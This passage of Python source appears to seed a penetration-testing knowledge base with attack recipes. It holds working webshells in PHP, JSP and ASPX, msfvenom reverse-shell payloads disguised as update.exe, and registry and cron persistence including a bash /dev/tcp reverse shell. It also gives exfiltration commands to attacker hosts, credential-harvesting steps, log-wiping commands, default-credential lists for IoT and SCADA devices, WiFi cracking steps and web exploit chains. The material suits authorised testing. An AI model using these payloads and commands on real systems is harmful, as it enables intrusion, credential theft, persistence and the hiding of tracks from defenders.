                "1. On target: knockd -d -i eth0 -s /etc/knockd.conf",
                "2. Config: sequence = 7000,8000,9000",
                "3. On attacker: knock target 7000 8000 9000",
                "4. Port opens and reverse shell connects",
            ],
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "webshell_variants", {
            "name": "Webshell Variants",
            "shells": {
                "php": "<?php echo system($_GET['cmd']); ?>",
                "php_exec": "<?php exec($_GET['cmd'], $out); echo implode('\\n', $out); ?>",
                "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
                "aspx": "<%@ Page Language=\"C#\" %><%System.Diagnostics.Process.Start(\"cmd.exe\", \"/c \" + Request[\"cmd\"]);%>",
                "perl": "#!/usr/bin/perl -w print `$_GET['cmd']`;",
            },
            "requires_auth": True, "risk": "high",
        }, "owasp"))

        seed.append(("backdoor", "dns_over_https_tunnel", {
            "name": "DNS over HTTPS C2 Tunnel",
            "steps": [
                "1. Set up DNS server with DOH support",
                "2. Encode commands in DNS queries",
                "3. Decode on C2 server",
                "4. Responses encoded in DNS answers",
            ],
            "tools": ["iodine", "dnscat2", "dns2tcp"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("backdoor", "icmp_tunnel", {
            "name": "ICMP Tunnel",
            "command": "ptunnel -p attacker_ip -lp 8000 -da target_ip -dp 22",
            "description": "Tunnel TCP connections through ICMP packets.",
            "tools": ["ptunnel", "icmpsh"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("backdoor", "named_pipe", {
            "name": "Named Pipe Backdoor (Windows)",
            "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker -f exe -o update.exe",
            "description": "Create executable that mimics Windows update for persistence.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "registry_persistence", {
            "name": "Windows Registry Persistence",
            "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\Windows\\update.exe",
            "description": "Auto-start reverse shell on boot.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        seed.append(("backdoor", "schtasks_persistence", {
            "name": "Scheduled Task Persistence",
            "command": "schtasks /create /tn Update /tr C:\\Windows\\update.exe /sc onlogon /ru SYSTEM",
            "description": "Run payload on every logon as SYSTEM.",
            "requires_auth": True, "risk": "high",
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # DEFAULT CREDENTIALS DATABASE (15)
        # ══════════════════════════════════════════════════════
        seed.append(("default_creds", "common_defaults", {
            "services": {
                "ssh": ["root:root", "admin:admin", "root:toor", "root:password", "admin:password", "user:user"],
                "ftp": ["anonymous:anonymous", "ftp:ftp", "admin:admin"],
                "mysql": ["root:", "root:root", "root:password", "admin:admin"],
                "postgresql": ["postgres:postgres", "postgres:password"],
                "redis": ["", "redis:redis"],
                "mongodb": ["admin:admin", "root:root"],
                "telnet": ["admin:admin", "root:root", "cisco:cisco"],
                "smb": ["administrator:password", "guest:guest"],
                "snmp": ["public:public", "private:private", "community:community"],
                "tomcat": ["admin:admin", "tomcat:tomcat", "admin:password"],
                "joomla": ["admin:admin"],
                "wordpress": ["admin:admin"],
                "router": ["admin:admin", "admin:password", "root:root", "admin:1234"],
            },
        }, "internal"))

        seed.append(("default_creds", "iot_defaults", {
            "devices": {
                "ip_camera": ["admin:admin", "admin:12345", "root:root", "admin:password"],
                "router": ["admin:admin", "admin:password", "root:root", "user:user"],
                "nas": ["admin:admin", "admin:1234", "root:root"],
                "printer": ["admin:admin", "admin:password", "root:root"],
                "smart_home": ["admin:admin", "admin:password"],
            },
        }, "internal"))

        seed.append(("default_creds", "scada_ics", {
            "systems": {
                "siemens_s7": ["admin:", "user:user"],
                "modbus": ["no_auth_required"],
                "bacnet": ["no_auth_required"],
                "dnp3": ["no_auth_required"],
                "opc": ["admin:admin"],
            },
            "warning": "SCADA/ICS systems often have no authentication. Be extremely careful.",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # POST-EXPLOITATION TECHNIQUES (15)
        # ══════════════════════════════════════════════════════
        seed.append(("post_exploit", "credential_harvesting", {
            "name": "Credential Harvesting",
            "steps": [
                "1. Linux: cat /etc/passwd; cat /etc/shadow; cat /etc/gshadow",
                "2. Linux: find / -name '*.conf' -o -name '*.key' -o -name 'wp-config.php' 2>/dev/null",
                "3. Windows: reg save HKLM\\SAM /tmp/sam",
                "4. Windows: reg save HKLM\\SYSTEM /tmp/system",
                "5. Windows: mimikatz sekurlsa::logonpasswords",
                "6. Browser: find ~/.mozilla -name 'logins.json'; find ~/.config/chromium -name 'Login Data'",
                "7. SSH: find / -name 'id_rsa' -o -name 'authorized_keys' 2>/dev/null",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "persistence_techniques", {
            "name": "Persistence Installation",
            "linux": [
                "crontab -e (reverse shell every 5 min)",
                "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
                "systemctl enable evil.service",
                "echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> ~/.bashrc",
            ],
            "windows": [
                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\update.exe",
                "schtasks /create /tn Update /tr C:\\update.exe /sc onlogon",
                "msfvenom -p windows/meterpreter/reverse_tcp -f exe -o update.exe",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "lateral_movement", {
            "name": "Lateral Movement",
            "techniques": [
                "psexec.py domain/user:pass@target",
                "wmiexec.py domain/user:pass@target 'cmd /c whoami'",
                "evil-winrm -i target -u user -p pass",
                "xfreerdp /v:target /u:user /p:pass",
                "ssh -J jump_host user@target",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "data_exfil_methods", {
            "name": "Data Exfiltration Methods",
            "methods": [
                "curl -X POST -d @file http://attacker.com/upload",
                "python3 -m http.server 8080 (on target)",
                "nc -w 3 attacker 4444 < file",
                "scp file user@attacker:/tmp/",
                "dns exfil: encode in DNS queries",
                "icmp exfil: encode in ICMP packets",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "covering_tracks", {
            "name": "Covering Tracks",
            "steps": [
                "1. Linux: history -c; rm /var/log/auth.log; echo > /tmp/.bash_history",
                "2. Windows: wevtutil cl Security; wevtutil cl System",
                "3. Clear bash: unset HISTFILE; export HISTFILESIZE=0",
                "4. Modify timestamps: touch -r /etc/passwd /tmp/backdoor",
                "5. Remove logs: find /var/log -name '*.log' -exec truncate -s 0 {} \\;",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "privesc_checklist", {
            "name": "Privilege Escalation Checklist",
            "linux": [
                "sudo -l",
                "find / -perm -4000 2>/dev/null (SUID)",
                "find / -writable -type f 2>/dev/null",
                "cat /etc/crontab",
                "getcap -r / 2>/dev/null",
                "uname -a (kernel version)",
                "cat /etc/ld.so.preload",
                "ls -la /etc/sudoers",
            ],
            "windows": [
                "whoami /priv",
                "systeminfo",
                "sc query",
                "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
                "wmic service list brief",
                "net user",
                "net localgroup administrators",
            ],
        }, "mitre"))

        seed.append(("post_exploit", "keylogging", {
            "name": "Keylogging",
            "methods": {
                "meterpreter": "keyscan_start; keyscan_dump; keyscan_stop",
                "linux": "script /tmp/keys.log; or use xinput",
                "windows": "meterpreter keyscan_start",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "screenshot_capture", {
            "name": "Screenshot Capture",
            "methods": {
                "meterpreter": "screenshot; screenshare",
                "linux": "DISPLAY=:0 import -window root /tmp/screen.png",
                "windows": "meterpreter screenshot",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "clipboard_hijacking", {
            "name": "Clipboard Monitoring",
            "methods": {
                "meterpreter": "clipboard_monitor_start",
                "linux": "xclip -selection clipboard -o",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "network_pivot_setup", {
            "name": "Network Pivoting Setup",
            "steps": [
                "1. AutoRoute: run autoroute -s 10.0.0.0/24",
                "2. SOCKS Proxy: use auxiliary/server/socks_proxy",
                "3. SSH Tunnel: ssh -D 1080 user@pivot",
                "4. Chisel: chisel server --reverse; chisel client attacker:8080 R:socks",
                "5. Proxychains: proxychains nmap -sT -Pn internal",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "password_spraying", {
            "name": "Password Spraying",
            "commands": [
                "crackmapexec smb domain -u users.txt -p 'Company2024!' --continue-on-success",
                "crackmapexec ssh targets.txt -u users.txt -p 'Password123!'",
                "hydra -L users.txt -p 'Summer2024!' ssh://{target}",
            ],
            "description": "Try common passwords against all accounts.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "token_impersonation", {
            "name": "Token Impersonation (Windows)",
            "steps": [
                "1. meterpreter > load incognito",
                "2. incognito_list_tokens -u",
                "3. incognito_impersonate_token NT AUTHORITY\\SYSTEM",
                "4. Use impersonated token for access",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "wmi_execution", {
            "name": "WMI Remote Execution",
            "command": "wmiexec.py domain/user:pass@target 'cmd.exe /c whoami > C:\\temp\\out.txt'",
            "description": "Execute commands via WMI without dropping files.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "dcom_exploitation", {
            "name": "DCOM Remote Execution",
            "commands": [
                "dcomexec.py domain/user:pass@target 'cmd.exe /c whoami'",
                "dcomexec.py -object MMC20.Application domain/user:pass@target 'cmd.exe /c whoami'",
            ],
            "description": "Execute via DCOM objects (MMC20.Application, ShellWindows).",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("post_exploit", "forced_authentication", {
            "name": "Forced Authentication Attacks",
            "methods": [
                "Responder -I eth0 (capture NTLM from UNC)",
                "PetitPotam.py target attacker ( coerce DC auth)",
                "SpoolSample.exe DC attacker (print spooler coercion)",
                "PrinterBug.py domain/user:pass@target attacker",
            ],
            "description": "Force machines to authenticate to attacker-controlled host.",
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # UTILITY COMMANDS (10)
        # ══════════════════════════════════════════════════════
        seed.append(("utility", "hash_cracking", {
            "name": "Hash Cracking Reference",
            "hash_modes": {
                "md5": "hashcat -m 0 hash.txt rockyou.txt",
                "sha1": "hashcat -m 100 hash.txt rockyou.txt",
                "sha256": "hashcat -m 1400 hash.txt rockyou.txt",
                "bcrypt": "hashcat -m 3200 hash.txt rockyou.txt",
                "ntlm": "hashcat -m 1000 hash.txt rockyou.txt",
                "netntlmv2": "hashcat -m 5600 hash.txt rockyou.txt",
                "kerberos_tgs": "hashcat -m 13100 hash.txt rockyou.txt",
                "kerberos_asrep": "hashcat -m 18200 hash.txt rockyou.txt",
                "sha512crypt": "hashcat -m 1800 hash.txt rockyou.txt",
                "des": "hashcat -m 14000 hash.txt rockyou.txt",
            },
        }, "internal"))

        seed.append(("utility", "file_transfer", {
            "name": "File Transfer Methods",
            "methods": {
                "python_http": "python3 -m http.server 8080",
                "wget": "wget http://attacker:8080/file",
                "curl_upload": "curl -T file http://attacker:8080/upload",
                "scp": "scp file user@attacker:/tmp/",
                "nc_send": "nc -w 3 attacker 4444 < file",
                "nc_receive": "nc -l -p 4444 > file",
                "base64": "base64 file | nc attacker 4444",
            },
        }, "internal"))

        seed.append(("utility", "port_forwarding", {
            "name": "Port Forwarding Methods",
            "methods": {
                "ssh_local": "ssh -L 8080:internal:80 user@pivot",
                "ssh_remote": "ssh -R 8080:localhost:80 user@attacker",
                "ssh_dynamic": "ssh -D 1080 user@pivot",
                "socat": "socat TCP-LISTEN:8080,fork TCP:internal:80",
                "iptables": "iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination internal:80",
                "chisel": "chisel client attacker:8080 R:8080:internal:80",
            },
        }, "internal"))

        seed.append(("utility", "msfvenom_payloads", {
            "name": "MSFvenom Payload Reference",
            "payloads": {
                "linux_reverse_tcp": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f elf -o payload",
                "windows_reverse_tcp": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o payload.exe",
                "php_reverse_tcp": "msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.php",
                "jsp_reverse_tcp": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.jsp",
                "war": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker LPORT=4444 -f war -o shell.war",
                "python_reverse_tcp": "msfvenom -p python/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f raw -o shell.py",
                "bash_reverse_tcp": "msfvenom -p cmd/unix/reverse_bash LHOST=attacker LPORT=4444 -f raw -o shell.sh",
            },
            "requires_auth": True,
        }, "mitre"))

        seed.append(("utility", "nmap_pentest_scripts", {
            "name": "Nmap Pentest Scripts",
            "scripts": {
                "smb_vuln": "--script smb-vuln* -p 445",
                "http_vuln": "--script http-vuln* -p 80,443",
                "ssl_vuln": "--script ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443",
                "ftp_anon": "--script ftp-anon -p 21",
                "ssh_auth": "--script ssh-auth-methods -p 22",
                "dns_brute": "--script dns-brute",
                "mysql_empty": "--script mysql-empty-password -p 3306",
                "rdp_vuln": "--script rdp-vuln-ms12-020 -p 3389",
                "snmp_brute": "--script snmp-brute -p 161",
            },
        }, "internal"))

        seed.append(("utility", "wordlists", {
            "name": "Wordlist Reference",
            "wordlists": {
                "passwords": "/usr/share/wordlists/rockyou.txt",
                "web_dirs_medium": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
                "web_dirs_small": "/usr/share/wordlists/dirb/common.txt",
                "web_dirs_big": "/usr/share/wordlists/dirb/big.txt",
                "usernames": "/usr/share/seclists/Usernames/top-usernames-shortlist.txt",
                "subdomains": "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
                "snmp_community": "/usr/share/seclists/Discovery/SNMP/common_snmp_community_strings.txt",
                "default_pass": "/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt",
            },
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # WIFI ATTACK PATTERNS (10)
        # ══════════════════════════════════════════════════════
        seed.append(("wifi_attack", "wpa2_handshake", {
            "name": "WPA2 Handshake Capture & Crack",
            "steps": [
                "airmon-ng check kill",
                "airmon-ng start wlxc4e984dfb30f",
                "airodump-ng --bssid MAC --channel CH -w /tmp/handshake wlan0mon",
                "aireplay-ng -0 10 -a MAC wlan0mon",
                "aircrack-ng -w rockyou.txt /tmp/handshake-01.cap",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "wpa2_pmkid", {
            "name": "WPA2 PMKID Attack",
            "steps": [
                "hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --filterlist_ap=MAC --filtermode=2",
                "hcxpcapngtool /tmp/pmkid.pcapng -o /tmp/hashes.txt",
                "hashcat -m 22000 /tmp/hashes.txt rockyou.txt",
            ],
            "description": "No client needed. Captures PMKID directly from AP.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "wps_pixie_dust", {
            "name": "WPS Pixie Dust Attack",
            "command": "reaver -i wlan0mon -b MAC -vv -K 1",
            "description": "Exploit WPS implementations with weak random number generators.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "wps_pin_brute", {
            "name": "WPS PIN Brute Force",
            "command": "reaver -i wlan0mon -b MAC -vv -p 12345670",
            "description": "Brute force 8-digit WPS PIN. Takes 4-10 hours.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "evil_twin", {
            "name": "Evil Twin AP",
            "steps": [
                "airmon-ng start wlxc4e984dfb30f",
                "airbase-ng -e 'FreeWiFi' -c 6 wlan0mon",
                "dnsmasq -C /tmp/dnsmasq.conf",
                "iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
                "hostapd /tmp/hostapd.conf",
            ],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "karma_attack", {
            "name": "Karma/MANA Attack",
            "description": "Respond to all probe requests with matching SSIDs.",
            "tools": ["hostapd-mana", "eaphammer"],
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "eap_clone", {
            "name": "WPA2-Enterprise Evil Twin",
            "steps": [
                "hostapd-wpe /tmp/hostapd-wpe.conf",
                "Wait for EAP credentials",
                "hashcat -m 18200 /tmp/hostapd-wpe.log rockyou.txt",
            ],
            "description": "Clone enterprise AP and capture MSCHAPv2 credentials.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "deauth_attack", {
            "name": "Deauthentication Attack",
            "command": "aireplay-ng -0 0 -a {bssid} wlan0mon",
            "description": "Continuous deauth to force all clients to disconnect.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "fragmentation_attack", {
            "name": "Fragmentation Attack",
            "steps": [
                "airmon-ng start wlxc4e984dfb30f",
                "python3 ptw.py wlan0mon MAC",
                "Decrypt packets without knowing key",
            ],
            "description": "Obtain PRGA to decrypt WEP traffic.",
            "requires_auth": True,
        }, "mitre"))

        seed.append(("wifi_attack", "client_isolation_bypass", {
            "name": "Client Isolation Bypass",
            "techniques": [
                "ARP spoofing to redirect traffic through attacker",
                "DHCP starvation to assign attacker as gateway",
                "DNS spoofing to redirect queries",
                "IPv6 router advertisement spoofing",
            ],
            "requires_auth": True,
        }, "mitre"))

        # ══════════════════════════════════════════════════════
        # REPORTING TEMPLATES (5)
        # ══════════════════════════════════════════════════════
        seed.append(("report_template", "pentest_report", {
            "name": "Penetration Test Report Template",
            "sections": [
                "1. Executive Summary",
                "2. Scope & Methodology",
                "3. Findings (Critical → Low)",
                "   - For each finding: Description, Evidence, Impact, Remediation, CVE",
                "4. Attack Narrative (step-by-step)",
                "5. Recommendations",
                "6. Appendices (tools used, scan results, evidence)",
            ],
        }, "internal"))

        seed.append(("report_template", "vuln_report", {
            "name": "Vulnerability Report Template",
            "fields": ["ID", "Title", "Severity", "CVSS", "CWE", "CVE", "Affected", "Description", "Evidence", "Remediation"],
        }, "internal"))

        seed.append(("report_template", "executive_summary", {
            "name": "Executive Summary Template",
            "content": "During [date], a penetration test was conducted against [scope]. [X] critical, [Y] high, [Z] medium vulnerabilities were discovered. The most critical finding allows [impact]. Immediate remediation is recommended for [specific findings].",
        }, "internal"))

        seed.append(("report_template", "network_map_report", {
            "name": "Network Map Report",
            "sections": [
                "Network topology diagram",
                "Device inventory (IP, hostname, OS, type)",
                "Service inventory (port, service, version)",
                "WiFi networks (SSID, BSSID, encryption, signal)",
                "Vulnerability summary per device",
                "Attack surface analysis",
            ],
        }, "internal"))

        seed.append(("report_template", "wifi_report", {
            "name": "WiFi Security Report",
            "sections": [
                "Networks found (SSID, BSSID, channel, encryption)",
                "Open networks (critical risk)",
                "Weak networks (WEP, short WPA2 passwords)",
                "Client devices per network",
                "Handshake capture status",
                "Recommended WPA3 migration",
            ],
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # ADVANCED SCAN COMBINATIONS (15)
        # ══════════════════════════════════════════════════════
        seed.append(("scan_profile", "stealth_recon_chain", {
            "name": "Stealth Reconnaissance Chain",
            "command": "nmap -sS -T2 -f --data-length 24 -oX /tmp/stealth_scan.xml {target} && nmap -sV -sC --version-intensity 1 -p$(grep -oP 'portid=\"\\K[0-9]+' /tmp/stealth_scan.xml | tr '\\n' ',') {target}",
            "tools": ["nmap"],
            "description": "SYN scan with fragmentation and decoy, followed by version detection only on discovered ports",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "full_audit_chain", {
            "name": "Full Security Audit Chain",
            "command": "masscan {target} -p0-65535 --rate=10000 -oL /tmp/masscan.txt && grep 'open' /tmp/masscan.txt | awk '{print $4}' | sort -u | xargs -I{} nmap -sV -sC -O --script=default,vuln -T4 {} -oN /tmp/nmap_vuln.txt",
            "tools": ["masscan", "nmap"],
            "description": "Fast full-port masscan followed by deep nmap vuln scan on discovered hosts only",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "iot_fingerprint", {
            "name": "IoT Device Fingerprinting",
            "command": "nmap -sV -sC -O -p21,22,23,53,80,443,554,8080,8443,9100 {target} --script=banner,http-title,ssl-cert,upnp-info",
            "tools": ["nmap"],
            "description": "Target common IoT ports with UPnP, SSL, and banner scripts for device identification",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "web_crawl_scan", {
            "name": "Web Application Crawl and Scan",
            "command": "nikto -h {url} -Tuning 1234567890abc -timeout 5 -maxtime 300s -o /tmp/nikto.json -Format json && sqlmap -u {url} --batch --level=1 --risk=1 --smart --crawl=3 --output-dir=/tmp/sqlmap",
            "tools": ["nikto", "sqlmap"],
            "description": "Nikto web scan combined with sqlmap smart crawl for SQL injection",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "snmp_deep_enum", {
            "name": "SNMP Deep Enumeration",
            "command": "nmap -sU -p161,162,10161,10162 -sV --script=snmp-brute,snmp-info,snmp-interfaces,snmp-win32-users,snmp-processes {target} && snmpwalk -v2c -c public {target} 1.3.6.1.2.1.1",
            "tools": ["nmap", "snmpwalk"],
            "description": "SNMP port scan with brute force and community string walking",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "mail_server_enum", {
            "name": "Mail Server Enumeration",
            "command": "nmap -p25,110,143,465,587,993,995 --script=smtp-enum-users,smtp-open-relay,imap-capabilities,pop3-capabilities {target} && nmap -p25,587 --script=smtp-brute {target}",
            "tools": ["nmap"],
            "description": "Enumerate mail services, users, relay capabilities, and brute force auth",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "database_audit", {
            "name": "Database Service Audit",
            "command": "nmap -p3306,5432,1433,1521,27017,6379,5984,9042 --script=mysql-info,pgsql-brute,mongodb-info,redis-info,memcached-info {target} && for port in 3306 5432 1433; do nmap -p$port --script=mysql-brute,pgsql-brute {target}; done",
            "tools": ["nmap"],
            "description": "Scan for all common databases with brute force and info gathering scripts",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "cloud_metadata_enum", {
            "name": "Cloud Metadata Enumeration",
            "command": "nmap -p80 --script=http-cloud-metadata-enum {target} && curl -s -o /dev/null -w '%{http_code}' http://169.254.169.254/latest/meta-data/ && curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "tools": ["nmap", "curl"],
            "description": "Check for cloud metadata endpoint exposure (AWS/GCP/Azure)",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "wireless_pivot_scan", {
            "name": "Wireless to Wired Pivot Scan",
            "command": "airodump-ng {iface} --write /tmp/capture --output-format csv && nmap -sn {gateway}/24 -oG /tmp/pivot_hosts.txt && grep 'Up' /tmp/pivot_hosts.txt | awk '{print $2}' | xargs -I{} nmap -sV -T4 {} -oN /tmp/pivot_nmap.txt",
            "tools": ["airodump-ng", "nmap"],
            "description": "Capture WiFi clients then scan their wired network from inside",
            "requires_auth": True,
        }, "internal"))
        seed.append(("scan_profile", "ssl_tls_audit", {
            "name": "SSL/TLS Security Audit",
            "command": "sslscan --no-colour {target}:443 && testssl --jsonfile /tmp/testssl.json {target} && nmap -p443 --script=ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection,ssl-cert {target}",
            "tools": ["sslscan", "testssl", "nmap"],
            "description": "Full SSL/TLS cipher suite audit with known vulnerability checks",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "docker_k8s_enum", {
            "name": "Docker/Kubernetes Enumeration",
            "command": "nmap -p2375,2376,6443,10250,10255 --script=http-methods,http-title,ssl-cert {target} && curl -s http://{target}:2375/version && curl -s http://{target}:2375/containers/json",
            "tools": ["nmap", "curl"],
            "description": "Discover exposed Docker APIs and Kubernetes endpoints for container escape",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "active_directory_enum", {
            "name": "Active Directory Enumeration",
            "command": "nmap -p88,389,636,3268,3269,5985,5986,9389 --script=kerberos-enum-users,ldap-rootdse,ldap-search {target} && nmap -p445 --script=smb-enum-domains,smb-enum-shares,smb-enum-users,smb-os-discovery {target}",
            "tools": ["nmap"],
            "description": "Enumerate Kerberos, LDAP, WinRM, and SMB for Active Directory information",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "printer_enum", {
            "name": "Printer Security Enumeration",
            "command": "nmap -p80,443,515,631,9100 --script=http-title,http-enum,ipp-info,printer-version-info {target} && snmpwalk -v1 -c public {target} 1.3.6.1.2.1.25.3.5.1.1 && curl -s http://{target}:631/printers",
            "tools": ["nmap", "snmpwalk", "curl"],
            "description": "Enumerate printer models, firmware, SNMP, and CUPS status pages",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "voip_enum", {
            "name": "VoIP/SIP Enumeration",
            "command": "nmap -p5060,5061 --script=sip-enum-tls,sip-methods {target} && svwar -e 100-999 {target} && nmap -p166,167,168,4569 --script=sip-*-detect {target}",
            "tools": ["nmap", "svwar"],
            "description": "Enumerate SIP services, brute force extensions, detect VoIP endpoints",
            "requires_auth": False,
        }, "internal"))
        seed.append(("scan_profile", "wireless_full_audit", {
            "name": "Complete Wireless Security Audit",
            "command": "airmon-ng start {iface} && airodump-ng {monitor_iface} --write /tmp/wifi_full --output-format pcapcsv && aireplay-ng --deauth 5 -a {bssid} {monitor_iface} && aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/wifi_full-01.cap",
            "tools": ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
            "description": "Full wireless audit: monitor mode, capture, deauth, and crack",
            "requires_auth": True,
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # ADVANCED EXPLOIT CHAINS (12)
        # ══════════════════════════════════════════════════════
        seed.append(("exploit_pattern", "ssrf_to_rce", {
            "name": "SSRF to RCE Chain",
            "steps": [
                "1. Identify SSRF via parameter injection (url=, src=, dest=, redirect=)",
                "2. Probe internal services: http://127.0.0.1:8080/, http://169.254.169.254/latest/meta-data/",
                "3. Chain with file read: file:///etc/passwd, file:///proc/self/environ",
                "4. Pivot to Redis/Memcached: gopher://127.0.0.1:6379/_*3%0d%0a",
                "5. Redis file write for webshell: SET /var/www/html/shell.php",
                "6. Trigger webshell for RCE",
            ],
            "tools": ["curl", "Burp Suite", "redis-cli"],
            "requires_auth": True,
            "risk": "critical",
        }, "owasp"))
        seed.append(("exploit_pattern", "xxe_to_file_read", {
            "name": "XXE to File Read and SSRF",
            "steps": [
                "1. Inject DTD entity in XML input: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "2. Reference entity in parameter: <data>&xxe;</data>",
                "3. Blind XXE: use out-of-band exfil via external DTD",
                "4. Use XXE for SSRF to internal services",
                "5. Combine with SSRF chain for RCE",
            ],
            "tools": ["curl", "Burp Suite"],
            "requires_auth": True,
            "risk": "high",
        }, "owasp"))
        seed.append(("exploit_pattern", "deserialization_attack", {
            "name": "Java Deserialization RCE",
            "steps": [
                "1. Identify serialized Java objects in cookies, parameters, headers",
                "2. Look for class names like CommonsCollections, Spring, Fastjson",
                "3. Generate ysoserial payload: java -jar ysoserial.jar CommonsCollections5 'cmd'",
                "4. Base64-encode and inject into serialized field",
                "5. Trigger deserialization endpoint",
                "6. Catch reverse shell on listener",
            ],
            "tools": ["ysoserial", "Burp Suite", "nc"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "jwt_none_algorithm", {
            "name": "JWT None Algorithm Bypass",
            "steps": [
                "1. Decode JWT header: echo 'header.payload.signature' | base64 -d",
                "2. Check if alg field is RS256 or HS256",
                "3. Modify header to {\"alg\":\"none\",\"typ\":\"JWT\"}",
                "4. Remove signature portion (keep trailing dot)",
                "5. Encode modified token: echo -n 'header.payload.' | base64",
                "6. Send modified token in Authorization header",
            ],
            "tools": ["jwt_tool", "curl"],
            "requires_auth": True,
            "risk": "high",
        }, "owasp"))
        seed.append(("exploit_pattern", "oauth_token_theft", {
            "name": "OAuth Token Theft and Replay",
            "steps": [
                "1. Intercept authorization code in OAuth redirect",
                "2. Exchange code for access token at /oauth/token",
                "3. Use stolen token to access protected resources",
                "4. If refresh token obtained, maintain persistent access",
                "5. Check for token in URL fragments, referer headers",
            ],
            "tools": ["Burp Suite", "curl", "oauth2-proxy"],
            "requires_auth": True,
            "risk": "high",
        }, "owasp"))
        seed.append(("exploit_pattern", "graphql_introspection", {
            "name": "GraphQL Introspection and Exploitation",
            "steps": [
                "1. Detect GraphQL endpoint: POST /graphql or /graphiql",
                "2. Run introspection query: {__schema{types{name,fields{name}}}}",
                "3. Enumerate all types, queries, mutations",
                "4. Look for admin mutations (deleteUser, updateRole, etc.)",
                "5. Test for injection in query parameters",
                "6. Brute force mutation arguments for access bypass",
            ],
            "tools": ["graphql-cop", "curl", "Burp Suite"],
            "requires_auth": True,
            "risk": "high",
        }, "owasp"))
        seed.append(("exploit_pattern", "smb_signing_disabled", {
            "name": "SMB Signing Disabled Relay",
            "steps": [
                "1. Enumerate hosts with SMB signing disabled: nmap --script=smb-security-mode -p445 targets",
                "2. Set up ntlmrelayx: ntlmrelayx.py -t target -smb2support",
                "3. Poison LLMNR/mDNS: responder -I eth0",
                "4. Wait for victim to connect (or force via wmic /target)",
                "5. Relay captured NTLMv2 hash to target",
                "6. Access shares or execute commands via relayed session",
            ],
            "tools": ["ntlmrelayx", "responder", "nmap"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
